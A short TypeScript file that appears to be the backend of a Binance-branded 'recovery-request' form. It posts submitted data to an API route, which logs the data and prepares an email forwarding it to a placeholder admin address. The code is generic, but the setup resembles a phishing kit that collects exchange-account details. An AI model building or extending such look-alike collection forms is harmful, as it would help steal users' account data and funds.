
// API endpoint for form submissions
export async function submitForm(formData: any) {
  try {
    const response = await fetch('/api/form-submission', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        step: 'recovery-request',
        data: formData,
        timestamp: new Date().toISOString(),
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to submit form');
    }

    return await response.json();
  } catch (error) {
    console.error('Error submitting form:', error);
    throw error;
  }
}

// API endpoint for form submissions
export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { step, data, timestamp } = body;

    // Log the form submission
    console.log(`Form submission - Step: ${step}`, data);

    // In a real application, you would send this to your email service
    // For now, we'll just log it and return success
    
    // Example email content
    const emailContent = {
      to: 'admin@yourcompany.com',
      subject: `Binance Form Submission - ${step}`,
      body: `
        Step: ${step}
        Timestamp: ${timestamp}
        Data: ${JSON.stringify(data, null, 2)}
      `
    };

    // Here you would integrate with your email service (SendGrid, NodeMailer, etc.)
    // await sendEmail(emailContent);

    return new Response(
      JSON.stringify({ success: true, message: 'Form data submitted successfully' }),
      {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  } catch (error) {
    console.error('Error processing form submission:', error);
    return new Response(
      JSON.stringify({ success: false, error: 'Failed to process form submission' }),
      {
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  }
}
